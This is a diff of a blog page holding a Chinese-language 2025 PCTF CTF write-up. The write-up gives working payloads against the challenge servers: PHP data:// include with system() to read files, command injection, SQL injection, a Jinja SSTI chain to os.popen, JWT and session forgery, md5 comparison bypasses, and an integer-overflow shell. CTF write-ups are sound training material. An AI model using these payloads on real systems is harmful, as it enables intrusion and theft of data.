@@ -1,5 +1,5 @@
 <!DOCTYPE html>
-<html lang="en" dir="auto" data-theme="auto">
+<html lang="zh-cn" dir="auto">
 
 <head><meta charset="utf-8">
 <meta http-equiv="X-UA-Compatible" content="IE=edge">
@@ -9,7 +9,7 @@
 <meta name="keywords" content="ctf, write up">
 <meta name="description" content="Web
 EZPHP
-爆破数字，为 114514，然后发送 POST 请求 http://challenge2.pctf.top:31855/?number=114514&amp;action=include，filename=data://text/plain,&lt;?php system(&#39;ls -a /&#39;); ?&gt;，看下 flag 在 2t9I0T6BaYFEZGqu 这个文件里，然后再发送一个 data://text/plain,&lt;?php system(&#39;cat /2t9I0T6BaYFEZGqu&#39;); ?&gt; 即可拿到 flag。
+爆破数字，为 114514，然后发送 POST 请求 http://challenge2.pctf.top:31855/?number=114514&action=include，filename=data://text/plain,&lt;?php system(&#39;ls -a /&#39;); ?&gt;，看下 flag 在 2t9I0T6BaYFEZGqu 这个文件里，然后再发送一个 data://text/plain,&lt;?php system(&#39;cat /2t9I0T6BaYFEZGqu&#39;); ?&gt; 即可拿到 flag。
 Jwt_password_manager
 打开 app.py，发现 SECRET_KEY 都给了，访问 jwt.io，找到 JWT Encoder，把 payload 改成 { &#39;username&#39;: &#39;admin&#39; }，把 SECRET_KEY 填进去，把得到的 token 写到 cookie 里面，即可以 admin 的身份登录并拿到 flag。
 We_will_rockyou
@@ -20,7 +20,7 @@ if(isset($_GET[&#39;begin&#39;])==&#39;admin&#39;) 只需 begin 存在即可。
 if(!preg_match(&#39;/admin/i&#39;,$begin)) 只需 begin 不包含 admin 即可，因此输入 123。">
 <meta name="author" content="ok-komputer">
 <link rel="canonical" href="https://ok-komputer.github.io/posts/pctf-wp/">
-<link crossorigin="anonymous" href="/assets/css/stylesheet.ade297085aa589dc983d8c19610af8dfc347deef17b183b06b333077375045ad.css" integrity="sha256-reKXCFqlidyYPYwZYQr438NH3u8XsYOwazMwdzdQRa0=" rel="preload stylesheet" as="style">
+<link crossorigin="anonymous" href="/assets/css/stylesheet.6ad59631f6c2768a4592d27068d54364d637cac5c853d949b7849073cb1aa97d.css" integrity="sha256-atWWMfbCdopFktJwaNVDZNY3ysXIU9lJt4SQc8saqX0=" rel="preload stylesheet" as="style">
 <link rel="icon" href="https://ok-komputer.github.io/%3Clink%20/%20abs%20url%3E">
 <link rel="icon" type="image/png" sizes="16x16" href="https://ok-komputer.github.io/favicon-16x16.png">
 <link rel="icon" type="image/png" sizes="32x32" href="https://ok-komputer.github.io/favicon-32x32.png">
@@ -28,7 +28,7 @@ if(!preg_match(&#39;/admin/i&#39;,$begin)) 只需 begin 不包含 admin 即可�
 <link rel="mask-icon" href="https://ok-komputer.github.io/safari-pinned-tab.svg">
 <meta name="theme-color" content="#2e2e33">
 <meta name="msapplication-TileColor" content="#2e2e33">
-<link rel="alternate" hreflang="en" href="https://ok-komputer.github.io/posts/pctf-wp/">
+<link rel="alternate" hreflang="zh-cn" href="https://ok-komputer.github.io/posts/pctf-wp/">
 <noscript>
     <style>
         #theme-toggle,
@@ -49,60 +49,26 @@ if(!preg_match(&#39;/admin/i&#39;,$begin)) 只需 begin 不包含 admin 即可�
                 --code-block-bg: rgb(46, 46, 51);
                 --code-bg: rgb(55, 56, 62);
                 --border: rgb(51, 51, 51);
-                color-scheme: dark;
             }
 
             .list {
                 background: var(--theme);
             }
 
-            .toc {
-                background: var(--entry);
+            .list:not(.dark)::-webkit-scrollbar-track {
+                background: 0 0;
             }
-        }
 
-        @media (prefers-color-scheme: light) {
-            .list::-webkit-scrollbar-thumb {
-                border-color: var(--code-bg);
+            .list:not(.dark)::-webkit-scrollbar-thumb {
+                border-color: var(--theme);
             }
         }
 
     </style>
-</noscript>
-<script>
-    if (localStorage.getItem("pref-theme") === "dark") {
-        document.querySelector("html").dataset.theme = 'dark';
-    } else if (localStorage.getItem("pref-theme") === "light") {
-       document.querySelector("html").dataset.theme = 'light';
-    } else if (window.matchMedia('(prefers-color-scheme: dark)').matches) {
-        document.querySelector("html").dataset.theme = 'dark';
-    } else {
-        document.querySelector("html").dataset.theme = 'light';
-    }
-
-</script><meta property="og:url" content="https://ok-komputer.github.io/posts/pctf-wp/">
-  <meta property="og:site_name" content="OK Komputer">
-  <meta property="og:title" content="2025 PCTF WriteUp">
-  <meta property="og:description" content="Web EZPHP 爆破数字，为 114514，然后发送 POST 请求 http://challenge2.pctf.top:31855/?number=114514&amp;action=include，filename=data://text/plain,&lt;?php system(&#39;ls -a /&#39;); ?&gt;，看下 flag 在 2t9I0T6BaYFEZGqu 这个文件里，然后再发送一个 data://text/plain,&lt;?php system(&#39;cat /2t9I0T6BaYFEZGqu&#39;); ?&gt; 即可拿到 flag。
-Jwt_password_manager 打开 app.py，发现 SECRET_KEY 都给了，访问 jwt.io，找到 JWT Encoder，把 payload 改成 { &#39;username&#39;: &#39;admin&#39; }，把 SECRET_KEY 填进去，把得到的 token 写到 cookie 里面，即可以 admin 的身份登录并拿到 flag。
-We_will_rockyou 在网上找 rockyou.txt，逐个爆破，用户名是 admin123，密码是 lovers（每次的密码都不一样），进入仪表盘后运行 ls 发现 flag.txt，由于这个命令检查只检查第一个命令，所以运行 ls ;cat flag.txt，发现 PCTF{flag_is_not_here}，再看题目发现 flag 原来在 /flag，修改后重新运行命令拿到 flag。
-php_with_md5 先通过弱比较，然后再碰撞通过强比较。
-if(isset($_GET[&#39;begin&#39;])==&#39;admin&#39;) 只需 begin 存在即可。
-if(!preg_match(&#39;/admin/i&#39;,$begin)) 只需 begin 不包含 admin 即可，因此输入 123。">
-  <meta property="og:locale" content="zh-cn">
-  <meta property="og:type" content="article">
-    <meta property="article:section" content="posts">
-    <meta property="article:published_time" content="2025-11-30T21:09:19+08:00">
-    <meta property="article:modified_time" content="2025-11-30T21:09:19+08:00">
-    <meta property="article:tag" content="Ctf">
-    <meta property="article:tag" content="Write Up">
-      <meta property="og:image" content="https://avatars.githubusercontent.com/u/226872255?v=4">
-<meta name="twitter:card" content="summary_large_image">
-<meta name="twitter:image" content="https://avatars.githubusercontent.com/u/226872255?v=4">
-<meta name="twitter:title" content="2025 PCTF WriteUp">
-<meta name="twitter:description" content="Web
+</noscript><meta property="og:title" content="2025 PCTF WriteUp" />
+<meta property="og:description" content="Web
 EZPHP
-爆破数字，为 114514，然后发送 POST 请求 http://challenge2.pctf.top:31855/?number=114514&amp;action=include，filename=data://text/plain,&lt;?php system(&#39;ls -a /&#39;); ?&gt;，看下 flag 在 2t9I0T6BaYFEZGqu 这个文件里，然后再发送一个 data://text/plain,&lt;?php system(&#39;cat /2t9I0T6BaYFEZGqu&#39;); ?&gt; 即可拿到 flag。
+爆破数字，为 114514，然后发送 POST 请求 http://challenge2.pctf.top:31855/?number=114514&action=include，filename=data://text/plain,&lt;?php system(&#39;ls -a /&#39;); ?&gt;，看下 flag 在 2t9I0T6BaYFEZGqu 这个文件里，然后再发送一个 data://text/plain,&lt;?php system(&#39;cat /2t9I0T6BaYFEZGqu&#39;); ?&gt; 即可拿到 flag。
 Jwt_password_manager
 打开 app.py，发现 SECRET_KEY 都给了，访问 jwt.io，找到 JWT Encoder，把 payload 改成 { &#39;username&#39;: &#39;admin&#39; }，把 SECRET_KEY 填进去，把得到的 token 写到 cookie 里面，即可以 admin 的身份登录并拿到 flag。
 We_will_rockyou
@@ -110,7 +76,28 @@ We_will_rockyou
 php_with_md5
 先通过弱比较，然后再碰撞通过强比较。
 if(isset($_GET[&#39;begin&#39;])==&#39;admin&#39;) 只需 begin 存在即可。
-if(!preg_match(&#39;/admin/i&#39;,$begin)) 只需 begin 不包含 admin 即可，因此输入 123。">
+if(!preg_match(&#39;/admin/i&#39;,$begin)) 只需 begin 不包含 admin 即可，因此输入 123。" />
+<meta property="og:type" content="article" />
+<meta property="og:url" content="https://ok-komputer.github.io/posts/pctf-wp/" />
+<meta property="og:image" content="https://avatars.githubusercontent.com/u/226872255?v=4" />
+<meta property="article:section" content="posts" />
+<meta property="article:published_time" content="2025-11-30T21:09:19+08:00" />
+<meta property="article:modified_time" content="2025-11-30T21:09:19+08:00" /><meta property="og:site_name" content="OK Komputer" />
+
+<meta name="twitter:card" content="summary_large_image" />
+<meta name="twitter:image" content="https://avatars.githubusercontent.com/u/226872255?v=4" />
+<meta name="twitter:title" content="2025 PCTF WriteUp"/>
+<meta name="twitter:description" content="Web
+EZPHP
+爆破数字，为 114514，然后发送 POST 请求 http://challenge2.pctf.top:31855/?number=114514&action=include，filename=data://text/plain,&lt;?php system(&#39;ls -a /&#39;); ?&gt;，看下 flag 在 2t9I0T6BaYFEZGqu 这个文件里，然后再发送一个 data://text/plain,&lt;?php system(&#39;cat /2t9I0T6BaYFEZGqu&#39;); ?&gt; 即可拿到 flag。
+Jwt_password_manager
+打开 app.py，发现 SECRET_KEY 都给了，访问 jwt.io，找到 JWT Encoder，把 payload 改成 { &#39;username&#39;: &#39;admin&#39; }，把 SECRET_KEY 填进去，把得到的 token 写到 cookie 里面，即可以 admin 的身份登录并拿到 flag。
+We_will_rockyou
+在网上找 rockyou.txt，逐个爆破，用户名是 admin123，密码是 lovers（每次的密码都不一样），进入仪表盘后运行 ls 发现 flag.txt，由于这个命令检查只检查第一个命令，所以运行 ls ;cat flag.txt，发现 PCTF{flag_is_not_here}，再看题目发现 flag 原来在 /flag，修改后重新运行命令拿到 flag。
+php_with_md5
+先通过弱比较，然后再碰撞通过强比较。
+if(isset($_GET[&#39;begin&#39;])==&#39;admin&#39;) 只需 begin 存在即可。
+if(!preg_match(&#39;/admin/i&#39;,$begin)) 只需 begin 不包含 admin 即可，因此输入 123。"/>
 
 
 <script type="application/ld+json">
@@ -139,13 +126,13 @@ if(!preg_match(&#39;/admin/i&#39;,$begin)) 只需 begin 不包含 admin 即可�
   "@type": "BlogPosting",
   "headline": "2025 PCTF WriteUp",
   "name": "2025 PCTF WriteUp",
-  "description": "Web EZPHP 爆破数字，为 114514，然后发送 POST 请求 http://challenge2.pctf.top:31855/?number=114514\u0026amp;action=include，filename=data://text/plain,\u0026lt;?php system('ls -a /'); ?\u0026gt;，看下 flag 在 2t9I0T6BaYFEZGqu 这个文件里，然后再发送一个 data://text/plain,\u0026lt;?php system('cat /2t9I0T6BaYFEZGqu'); ?\u0026gt; 即可拿到 flag。\nJwt_password_manager 打开 app.py，发现 SECRET_KEY 都给了，访问 jwt.io，找到 JWT Encoder，把 payload 改成 { 'username': 'admin' }，把 SECRET_KEY 填进去，把得到的 token 写到 cookie 里面，即可以 admin 的身份登录并拿到 flag。\nWe_will_rockyou 在网上找 rockyou.txt，逐个爆破，用户名是 admin123，密码是 lovers（每次的密码都不一样），进入仪表盘后运行 ls 发现 flag.txt，由于这个命令检查只检查第一个命令，所以运行 ls ;cat flag.txt，发现 PCTF{flag_is_not_here}，再看题目发现 flag 原来在 /flag，修改后重新运行命令拿到 flag。\nphp_with_md5 先通过弱比较，然后再碰撞通过强比较。\nif(isset($_GET['begin'])=='admin') 只需 begin 存在即可。\nif(!preg_match('/admin/i',$begin)) 只需 begin 不包含 admin 即可，因此输入 123。\n",
+  "description": "Web EZPHP 爆破数字，为 114514，然后发送 POST 请求 http://challenge2.pctf.top:31855/?number=114514\u0026action=include，filename=data://text/plain,\u0026lt;?php system('ls -a /'); ?\u0026gt;，看下 flag 在 2t9I0T6BaYFEZGqu 这个文件里，然后再发送一个 data://text/plain,\u0026lt;?php system('cat /2t9I0T6BaYFEZGqu'); ?\u0026gt; 即可拿到 flag。\nJwt_password_manager 打开 app.py，发现 SECRET_KEY 都给了，访问 jwt.io，找到 JWT Encoder，把 payload 改成 { 'username': 'admin' }，把 SECRET_KEY 填进去，把得到的 token 写到 cookie 里面，即可以 admin 的身份登录并拿到 flag。\nWe_will_rockyou 在网上找 rockyou.txt，逐个爆破，用户名是 admin123，密码是 lovers（每次的密码都不一样），进入仪表盘后运行 ls 发现 flag.txt，由于这个命令检查只检查第一个命令，所以运行 ls ;cat flag.txt，发现 PCTF{flag_is_not_here}，再看题目发现 flag 原来在 /flag，修改后重新运行命令拿到 flag。\nphp_with_md5 先通过弱比较，然后再碰撞通过强比较。\nif(isset($_GET['begin'])=='admin') 只需 begin 存在即可。\nif(!preg_match('/admin/i',$begin)) 只需 begin 不包含 admin 即可，因此输入 123。\n",
   "keywords": [
     "ctf", "write up"
   ],
   "articleBody": "Web EZPHP 爆破数字，为 114514，然后发送 POST 请求 http://challenge2.pctf.top:31855/?number=114514\u0026action=include，filename=data://text/plain,\u003c?php system('ls -a /'); ?\u003e，看下 flag 在 2t9I0T6BaYFEZGqu 这个文件里，然后再发送一个 data://text/plain,\u003c?php system('cat /2t9I0T6BaYFEZGqu'); ?\u003e 即可拿到 flag。\nJwt_password_manager 打开 app.py，发现 SECRET_KEY 都给了，访问 jwt.io，找到 JWT Encoder，把 payload 改成 { 'username': 'admin' }，把 SECRET_KEY 填进去，把得到的 token 写到 cookie 里面，即可以 admin 的身份登录并拿到 flag。\nWe_will_rockyou 在网上找 rockyou.txt，逐个爆破，用户名是 admin123，密码是 lovers（每次的密码都不一样），进入仪表盘后运行 ls 发现 flag.txt，由于这个命令检查只检查第一个命令，所以运行 ls ;cat flag.txt，发现 PCTF{flag_is_not_here}，再看题目发现 flag 原来在 /flag，修改后重新运行命令拿到 flag。\nphp_with_md5 先通过弱比较，然后再碰撞通过强比较。\nif(isset($_GET['begin'])=='admin') 只需 begin 存在即可。\nif(!preg_match('/admin/i',$begin)) 只需 begin 不包含 admin 即可，因此输入 123。\nif($_POST['password']==md5($_POST['password'])) 用弱比较绕过即可，若一个字符串的 MD5 哈希值以 0e 开头，且后面全是数字，PHP 会将其当作科学计数法，结果为 0。md5('0e215962017') = '0e291242476940776845150308577824'，两边都以 0e 开头且后面是数字，可以绕过。\nif($_GET['a']!=$_GET['b'] \u0026\u0026 md5($_GET['a'])==md5($_GET['b'])) 也是利用弱比较绕过，md5('QNKCDZO') = '0e830400451993494058024219903391'，md5('240610708') = '0e462097431906509019562988736854'，两个值不相同、都是 0e 开头且后面为数字，弱比较通过。\nif($_GET['c']!=$_GET['d'] \u0026\u0026 md5($_GET['c'])===md5($_GET['d'])) 要求强相等，在网上搜索发现存在这样的两个值 M%C9h%FF%0E%E3%5C%20%95r%D4w%7Br%15%87%D3o%A7%B2%1B%DCV%B7J%3D%C0x%3E%7B%95%18%AF%BF%A2%00%A8%28K%F3n%8EKU%B3_Bu%93%D8Igm%A0%D1U%5D%83%60%FB_%07%FE%A2 和 M%C9h%FF%0E%E3%5C%20%95r%D4w%7Br%15%87%D3o%A7%B2%1B%DCV%B7J%3D%C0x%3E%7B%95%18%AF%BF%A2%02%A8%28K%F3n%8EKU%B3_Bu%93%D8Igm%A0%D1%D5%5D%83%60%FB_%07%FE%A2 值不相等但 md5 值相等。\n发送这个 POST 请求\nPOST /?begin=123\u0026a=QNKCDZO\u0026b=240610708\u0026c=M%C9h%FF%0E%E3%5C%20%95r%D4w%7Br%15%87%D3o%A7%B2%1B%DCV%B7J%3D%C0x%3E%7B%95%18%AF%BF%A2%00%A8%28K%F3n%8EKU%B3_Bu%93%D8Igm%A0%D1U%5D%83%60%FB_%07%FE%A2\u0026d=M%C9h%FF%0E%E3%5C%20%95r%D4w%7Br%15%87%D3o%A7%B2%1B%DCV%B7J%3D%C0x%3E%7B%95%18%AF%BF%A2%02%A8%28K%F3n%8EKU%B3_Bu%93%D8Igm%A0%D1%D5%5D%83%60%FB_%07%FE%A2 HTTP/1.1 Host: challenge2.pctf.top:30956 Content-Type: application/x-www-form-urlencoded Content-Length: 51 password=0e215962017\u0026cmd=system('cat%20%2Fflag')%3B 即可拿到 flag。\nsql_in 用户名填 admin' OR '1'='1，密码随便填即可拿到 flag。\n复读机 先输入 {{ config }} 看一下，发现 SSTI 可以执行，但没看到 flag。\n用这个 SSTI 语句可以执行命令 {% for c in [].__class__.__base__.__subclasses__() %}{% if c.__name__=='catch_warnings' %}{{ c.__init__.__globals__['__builtins__'].eval(\"__import__('os').popen('命令').read()\") }}{% endif %}{% endfor %}\n先执行 ls -a 看一下，没找到 flag，在根目录和 app.py 也没找到。\n然后执行 printenv 看一下环境变量，找到 flag 了。\nDo_you_know_session? 打开开发者工具查看 Cookie 发现一串 session，base64 转码后是 { 'user': 'guest' }，在搜索中输入 {{ config }} 就可以看到 SECRET_KEY，用这个 key 转码 { 'user': 'admin' } 得到新的 session 在写到 cookie 里面即可以 admin 的身份读取文件，然而 flag 在环境变量里，读取 /proc/self/environment 即可拿到 flag。\nwhat_is_jsfuck 打开开发者工具，看到要先输入 I want flag，然后把得到的 jsfuck 代码输入到控制台执行即可拿到 flag。\nMisc 签到 PCTF{Welcome_tO_PCTF_2025_!!!!}\nai_starts_from_here 这一串数字是 token，从网上下载 deepseek 的 token 词表再替换即可拿到 flag。\n仍旧物理作业 把后缀名改为 .zip 再解压，发现里面没有 document.xml 但是有 word.xml，打开可以看到在“这里是物理作业”和下面的几个公式下面，有一连串的 和 中间有若干空格 的组合，怀疑是摩斯电码，解码后得到 flag。\nez_forensic 用 7-Zip 一次性把所有 .bak 文件解压，打开电话设置里的 _tmp_meta 文件，发现里面有 cezanne 的字样，在网上搜索为 Redmi_K30_Ultra。\n打开 WLAN 设置看到里面的 wifi 里有一个叫 nubia Z60 Ultra 的热点，是嫌疑人的另一部手机。\n查看 descript.xml，发现有一个 com.v2ray.ang 没有备份。\n打开天气，发现有经纬度字样：\"longtitude\\\":\\\"109.786\\\",\\\"latitude\\\":\\\"26.908\\\"。\n在 Google Earth 的 sp 文件夹下的 com.google.android.flutter.plugins.ssoauth.xml 文件里找到邮箱 zhengzha777@gmail.com。\nez_sql 用 Wireshark 打开，发现这是一串 sql 盲注的流量，启用过滤器 http，把一些其他请求剔除掉，计算每个从请求到响应的时间，如果接近 0.5 秒，则为盲注成功，否则为盲注失败，把所有盲注成功的语句拿到一块分析，即可拿到 flag。\nPwn test_your_nc 这是一道任意进制转换+运算的题，编写脚本即可。\nfrom pwn import * import re import time # 进制转换 def int_to_base(n: int, base: int) -\u003e str: if not (2 \u003c= base \u003c= 36): raise ValueError(\"Base must be between 2 and 36\") if n == 0: return \"0\" digits = \"0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ\" sign = \"-\" if n \u003c 0 else \"\" n = abs(n) result = [] while n \u003e 0: result.append(digits[n % base]) n = n // base return sign + \"\".join(reversed(result)) # 正则表达式：匹配题目格式 [XXXX] (base B) N1 OP N2 = ? QUESTION_PATTERN = r\"\\[(\\d{4})\\] \\(base (\\d+)\\) ([A-Za-z0-9\\-]+) ([\\+\\-\\*\\%]) ([A-Za-z0-9\\-]+) = \\?\" def split_lines(data: str) -\u003e list: return re.split(r\"[\\r\\n]+\", data.strip()) def solve(): p = remote(\"challenge2.pctf.top\", 31719, timeout=60) log.info(\"连接成功，等待第一题...\") buffer = b\"\" while True: try: data = p.recv(4096, timeout=5) if not data: log.warning(\"未收到数据，重试...\") time.sleep(0.5) continue buffer += data if b\"[0001]\" in buffer.lower(): log.info(\"找到第一题，开始答题流程！\") break except Exception as e: log.warning(f\"读取欢迎信息异常：{str(e)}，重试...\") time.sleep(0.5) # 初始化缓冲区和剩余行 buffer_str = buffer.decode(\"ascii\", errors=\"ignore\") remaining_lines = split_lines(buffer_str) correct_count = 0 for idx in range(2025): try: target_number = f\"[{idx+1:04d}]\" current_question = \"\" merging = False extra_content = \"\" while True: while remaining_lines: line = remaining_lines[0].strip() if not merging and line.startswith(target_number): merging = True current_question += line remaining_lines.pop(0) elif merging: current_question += line remaining_lines.pop(0) if \"= ?\" in current_question: eq_pos = current_question.find(\"= ?\") extra_content = current_question[eq_pos+3:] current_question = current_question[:eq_pos+3].strip() current_question = re.sub(r\"\\s+\", \" \", current_question) if extra_content.strip(): remaining_lines.insert(0, extra_content.strip()) break else: remaining_lines.pop(0) if merging and \"= ?\" in current_question: break data = p.recv(4096, timeout=5) if not data: log.error(f\"第{idx+1}题未找到完整题目，超时退出\".replace(\"%\", \"%%\")) p.close() return buffer_str += data.decode(\"ascii\", errors=\"ignore\") remaining_lines += split_lines(buffer_str) buffer_str = \"\" match = re.fullmatch(QUESTION_PATTERN, current_question) if not match: safe_question = current_question.replace(\"%\", \"%%\") log.error(f\"第{idx+1}题解析失败: {safe_question}\") break base = int(match.group(2)) num1_str = match.group(3) op = match.group(4) num2_str = match.group(5) num1 = int(num1_str, base) num2 = int(num2_str, base) if op == \"+\": res = num1 + num2 elif op == \"-\": res = num1 - num2 elif op == \"*\": res = num1 * num2 elif op == \"%\": res = num1 % num2 else: log.error(f\"第{idx+1}题未知运算符: {op}\".replace(\"%\", \"%%\")) break answer = int_to_base(res, base) prompt_found = False while not prompt_found: if remaining_lines: line = remaining_lines[0].strip() if \"Your answer\" in line and f\"base {base}\" in line: remaining_lines.pop(0) prompt_found = True else: remaining_lines.pop(0) else: data = p.recv(4096, timeout=5) if not data: log.error(f\"第{idx+1}题未收到输入提示，超时退出\".replace(\"%\", \"%%\")) p.close() return buffer_str += data.decode(\"ascii\", errors=\"ignore\") remaining_lines += split_lines(buffer_str) buffer_str = \"\" p.sendline(answer.encode(\"ascii\")) time.sleep(0.02) feedback = \"\" feedback_keywords = (\"Correct!\", \"Incorrect\", \"Invalid\", \"Empty\") while not feedback: if remaining_lines: line = remaining_lines[0].strip() if any(keyword in line for keyword in feedback_keywords): feedback = line remaining_lines.pop(0) else: remaining_lines.pop(0) else: data = p.recv(4096, timeout=10) if not data: log.error(f\"第{idx+1}题未收到反馈，超时退出\".replace(\"%\", \"%%\")) p.close() return buffer_str += data.decode(\"ascii\", errors=\"ignore\") remaining_lines += split_lines(buffer_str) buffer_str = \"\" if \"Correct!\" in feedback: correct_count += 1 if (idx + 1) % 100 == 0: log.info(f\"进度：{idx+1}/2025 题，正确率 {correct_count}/{idx+1}\") else: safe_feedback = feedback.replace(\"%\", \"%%\") safe_question = current_question.replace(\"%\", \"%%\") log.error(f\"第{idx+1}题错误：反馈={safe_feedback}，题目={safe_question}，答案={answer}\") break except Exception as e: safe_msg = str(e).replace(\"%\", \"%%\") log.error(f\"第{idx+1}题执行异常: {safe_msg}\") p.close() return if correct_count == 2025: log.success(\"全部题答对。\") else: log.error(f\"答题结束：答对{correct_count}/2025题，未拿到flag\".replace(\"%\", \"%%\")) p.close() if __name__ == \"__main__\": context.log_level = \"debug\" solve() type_err 打开 IDA，看到 obfuscate_value 函数将 value的每个字节与 0xAA 异或，结果存入 buffer。\n题目中 hint 由 0x80000000 异或生成，因此要使输入 b 的异或结果与 hint 匹配，b 必须等于 0x80000000（十进制 2147483648）。\n当 unsigned int a ≥ 0x80000000 时，转换为 int 会溢出，结果为负数补码（例如 0x80000000 → int 是 -2147483648，0x80000001 → int 是 -2147483647），均满足 \u003c -4。\n因此，第一个输入 a：2147483648（0x80000000），第二个输入 b：2147483648（0x80000000），即可拿到 shell，再执行 cat /flag 即可拿到 flag。\n",
   "wordCount" : "818",
-  "inLanguage": "en",
+  "inLanguage": "zh-cn",
   "image": "https://avatars.githubusercontent.com/u/226872255?v=4","datePublished": "2025-11-30T21:09:19+08:00",
   "dateModified": "2025-11-30T21:09:19+08:00",
   "author":{
@@ -167,13 +154,25 @@ if(!preg_match(&#39;/admin/i&#39;,$begin)) 只需 begin 不包含 admin 即可�
 }
 </script>
 </head>
-<body id="top">
-    <header class="header">
+
+<body class="" id="top">
+<script>
+    if (localStorage.getItem("pref-theme") === "dark") {
+        document.body.classList.add('dark');
+    } else if (localStorage.getItem("pref-theme") === "light") {
+        document.body.classList.remove('dark')
+    } else if (window.matchMedia('(prefers-color-scheme: dark)').matches) {
+        document.body.classList.add('dark');
+    }
+
+</script>
+
+<header class="header">
     <nav class="nav">
         <div class="logo">
             <a href="https://ok-komputer.github.io/" accesskey="h" title="Home (Alt + H)">Home</a>
             <div class="logo-switches">
-                <button id="theme-toggle" accesskey="t" title="(Alt + T)" aria-label="Toggle theme">
+                <button id="theme-toggle" accesskey="t" title="(Alt + T)">
                     <svg id="moon" xmlns="http://www.w3.org/2000/svg" width="24" height="18" viewBox="0 0 24 24"
                         fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"
                         stroke-linejoin="round">
@@ -212,7 +211,7 @@ if(!preg_match(&#39;/admin/i&#39;,$begin)) 只需 begin 不包含 admin 即可�
     <h1 class="post-title entry-hint-parent">
       2025 PCTF WriteUp
     </h1>
-    <div class="post-meta"><span title='2025-11-30 21:09:19 +0800 CST'>2025/11/30</span>&nbsp;·&nbsp;<span>4 min</span>&nbsp;·&nbsp;<span>818 words</span>&nbsp;·&nbsp;<span>ok-komputer</span>
+    <div class="post-meta"><span title='2025-11-30 21:09:19 +0800 CST'>2025/11/30</span>&nbsp;·&nbsp;4 min&nbsp;·&nbsp;818 words&nbsp;·&nbsp;ok-komputer
 
 </div>
   </header> <div class="toc">
@@ -258,7 +257,7 @@ if(!preg_match(&#39;/admin/i&#39;,$begin)) 只需 begin 不包含 admin 即可�
 
   <div class="post-content"><h2 id="web">Web<a hidden class="anchor" aria-hidden="true" href="#web">#</a></h2>
 <h3 id="ezphp">EZPHP<a hidden class="anchor" aria-hidden="true" href="#ezphp">#</a></h3>
-<p>爆破数字，为 114514，然后发送 POST 请求 <a href="http://challenge2.pctf.top:31855/?number=114514&amp;action=include">http://challenge2.pctf.top:31855/?number=114514&amp;action=include</a>，<code>filename=data://text/plain,&lt;?php system('ls -a /'); ?&gt;</code>，看下 flag 在 <code>2t9I0T6BaYFEZGqu</code> 这个文件里，然后再发送一个 <code>data://text/plain,&lt;?php system('cat /2t9I0T6BaYFEZGqu'); ?&gt;</code> 即可拿到 flag。</p>
+<p>爆破数字，为 114514，然后发送 POST 请求 <a href="http://challenge2.pctf.top:31855/?number=114514&amp;action=include">http://challenge2.pctf.top:31855/?number=114514&action=include</a>，<code>filename=data://text/plain,&lt;?php system('ls -a /'); ?&gt;</code>，看下 flag 在 <code>2t9I0T6BaYFEZGqu</code> 这个文件里，然后再发送一个 <code>data://text/plain,&lt;?php system('cat /2t9I0T6BaYFEZGqu'); ?&gt;</code> 即可拿到 flag。</p>
 <h3 id="jwt_password_manager">Jwt_password_manager<a hidden class="anchor" aria-hidden="true" href="#jwt_password_manager">#</a></h3>
 <p>打开 <code>app.py</code>，发现 <code>SECRET_KEY</code> 都给了，访问 <a href="https://jwt.io/">jwt.io</a>，找到 JWT Encoder，把 payload 改成 <code>{ 'username': 'admin' }</code>，把 <code>SECRET_KEY</code> 填进去，把得到的 token 写到 cookie 里面，即可以 admin 的身份登录并拿到 flag。</p>
 <h3 id="we_will_rockyou">We_will_rockyou<a hidden class="anchor" aria-hidden="true" href="#we_will_rockyou">#</a></h3>
@@ -504,12 +503,12 @@ if(!preg_match(&#39;/admin/i&#39;,$begin)) 只需 begin 不包含 admin 即可�
     </ul>
 <nav class="paginav">
   <a class="prev" href="https://ok-komputer.github.io/posts/isa-wp/">
-    <span class="title">« Prev</span>
+    <span class="title">« </span>
     <br>
     <span>2025 纳新赛 WriteUp</span>
   </a>
   <a class="next" href="https://ok-komputer.github.io/posts/sql-injection/">
-    <span class="title">Next »</span>
+    <span class="title"> »</span>
     <br>
     <span>SQL 注入 - CTF Web 学习笔记</span>
   </a>
@@ -583,21 +582,7 @@ if(!preg_match(&#39;/admin/i&#39;,$begin)) 只需 begin 不包含 admin 即可�
     </li>
 </ul>
 
-  </footer><script src="https://giscus.app/client.js"
-        data-repo="ok-komputer/ok-komputer.github.io"
-        data-repo-id="R_kgDOQSEoqQ"
-        data-category="Announcements"
-        data-category-id="DIC_kwDOQSEoqc4C0yaQ"
-        data-mapping="pathname"
-        data-strict="0"
-        data-reactions-enabled="1"
-        data-emit-metadata="0"
-        data-input-position="top"
-        data-theme="preferred_color_scheme"
-        data-lang="zh-CN"
-        crossorigin="anonymous"
-        async>
-</script>
+  </footer>
 </article>
     </main>
     
@@ -617,14 +602,9 @@ if(!preg_match(&#39;/admin/i&#39;,$begin)) 只需 begin 不包含 admin 即可�
 </a>
 
 <script>
-    let menu = document.getElementById('menu');
+    let menu = document.getElementById('menu')
     if (menu) {
-        
-        const scrollPosition = localStorage.getItem("menu-scroll-position");
-        if (scrollPosition) {
-            menu.scrollLeft = parseInt(scrollPosition, 10);
-        }
-        
+        menu.scrollLeft = localStorage.getItem("menu-scroll-position");
         menu.onscroll = function () {
             localStorage.setItem("menu-scroll-position", menu.scrollLeft);
         }
@@ -665,12 +645,11 @@ if(!preg_match(&#39;/admin/i&#39;,$begin)) 只需 begin 不包含 admin 即可�
 </script>
 <script>
     document.getElementById("theme-toggle").addEventListener("click", () => {
-        const html = document.querySelector("html");
-        if (html.dataset.theme === "dark") {
-            html.dataset.theme = 'light';
+        if (document.body.className.includes("dark")) {
+            document.body.classList.remove('dark');
             localStorage.setItem("pref-theme", 'light');
         } else {
-            html.dataset.theme = 'dark';
+            document.body.classList.add('dark');
             localStorage.setItem("pref-theme", 'dark');
         }
     })
